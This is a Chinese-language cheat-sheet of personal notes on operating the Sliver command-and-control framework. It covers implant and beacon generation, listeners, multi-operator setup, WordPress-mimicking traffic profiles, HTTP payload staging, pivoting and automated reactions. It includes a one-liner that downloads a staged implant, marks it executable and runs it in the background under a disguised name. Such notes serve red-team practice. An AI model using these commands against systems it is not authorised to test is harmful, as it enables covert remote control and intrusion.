---
title: Sliver
date: 2025-07-30
tags:
    - C2
---

# 常用命令
## 运行服务
> 虽然官方文档没提到，但是实际使用下来发现，sliver-server需要root权限，否则没法监听端口，如果使用多用户模式的话，只需要sliver-server使用root权限，sliver-client只需要普通用户权限即可
>

```plain
# 正常进入sliver-server的交互式命令行界面
sliver-server

# 后台跑sliver-server，适用于需要多用户的情况下，但是要先生成用户的配置文件
sliver-server daemon
```

## 基础命令
```plain
# 生成session
generate -b localhost --os linux --skip-symbols --debug -s temp/

# 生成beacon
generate beacon -b localhost --skip-symbols --debug -j 1 -S 5 --os linux

# 查看生成的beacon和session
implants

# 启动http监听
http

# 查看正在监听的服务
jobs

# 查看已经拿到的session
sessions

# 查看已经拿到的beacon
beacons

# 进入某个目标进行交互
use

# 退出server
exit

# 查看某个目标的信息
info

# 查看某个beacon的响应时间信息
beacons watch

```

## 交互命令
```plain
# 查看目标基础信息
info

# 进入shell
shell

# 退出
background

# 基础的文件操作、目录，通过help命令查询
ls
pwd
cd
mv .....

# 设置beacon的响应时间和抖动时间
reconfig -i 3s -j 1s

# 查看beacon的命令执行状态
tasks

# 查看beacon的某个命令执行结果
tasks fetch

# 在beacon上创建一个新的同名session连接，是在当前beacon中创建了一个goroutine线程跑session
interactive

# 启动socks5，只能在session中跑，socks5代理还不清楚怎么用，端口是在server端还是target端，需要再试试看
socks5 start

# 查看当前socks5列表
socks5

# 关闭指定socks5，需要指定id
socks5 stop -i 1

# 关停session连接，不能关beacon，并且也不是完全关，下个轮训会自动连回来
close
```

## 多用户模式
服务端，默认是`31337**<font style="color:rgb(255, 255, 255);background-color:rgb(24, 24, 27);"></font>**`

```plain
new-operator --name lyi --lhost 192.168.1.66 -P all
multiplayer
```

客户端

```plain
sliver-client import lyi_192.168.1.66.cfg
sliver-client
```

一般情况建议服务端配置system服务

```plain
[Unit]
Description=Sliver
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=on-failure
RestartSec=3
User=root
ExecStart=/usr/bin/sliver-server daemon

[Install]
WantedBy=multi-user.target
```

一行命令进行配置

```plain
sudo tee /etc/systemd/system/sliver-server.service > /dev/null << 'EOF'
[Unit]
Description=Sliver
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=on-failure
RestartSec=3
User=root
ExecStart=/usr/bin/sliver-server daemon

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable sliver-server
sudo systemctl start sliver-server
```



如果用了`multiplayer`命令之后，执行`sliver-server daemon`就会报告端口已占用，这是因为sliver-server已经启用了multiplayer的job，这时候需要通过`jobs`查看对应的id，然后`jobs -k 2`来关闭multiplayer，然后就可以正常跑`sliver-server daemon`了

# C2 Profiles
下载这个

[https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt)

然后依据这个创建c2profiles

```plain
c2profiles generate -f urls-wordpress-3.3.1.txt -n wordpress -
```

常用命令

```plain
查看当前已有的c2profiles
c2profiles

通过-C在生成beacon时指定c2profile
generate beacon -b localhost --skip-symbols --debug -j 1 -S 5 --os linux -C wordpress
```

# HTTP Payload staging
```plain
生成profile
profiles new beacon -b localhost --os linux --skip-symbols --debug profile_test

根据profile生成implant
profiles generate profile_test

设置implant对外暴露以便通过http下载
implants stage
```

然后通过`implants`命令查看implant的ID，然后通过curl可以去下载payload

```plain
curl http://localhost/test.yml?z=14274
```

也可以加密

```plain
根据profile生成implant，并且加密
profiles stage -c gzip profile_test
```

后续的stage实际上就是执行类似这样的操作

```plain
curl http://localhost/nothingtoseehere.yml?c=14274 --output nothingtoseehere && chmod u+x nothingtoseehere && nohup ./nothingtoseehere
```

# Pivots
pivots有两种，一种是TCP，另一种是命名管道，TCP适用所有平台，命名管道只能在windows

首先通过`use`连接到session，然后执行下面命令创建tcp

```plain
pivots tcp

pivots
```

然后`background`

```plain
 generate --tcp-pivot 127.0.0.1 --os linux
```

# Script
可以设置简单的自动脚本，但是无法做复杂逻辑，如果要做复杂逻辑，建议还是自己写一个客户端，比如用Python写，然后通过调用服务端的gRPC接口来实现

```plain
reaction set -e "session-connected"

[*] Setting reaction to: Session Opened

? Enter commands:  [Enter 2 empty lines to finish]pwd
env


[*] Set reaction to session-connected (id: 1)

```

这个设置完后，在有新的session连的时候就会自动触发这个脚本

可以通过`reaction --help`命令查看都有哪些触发事件

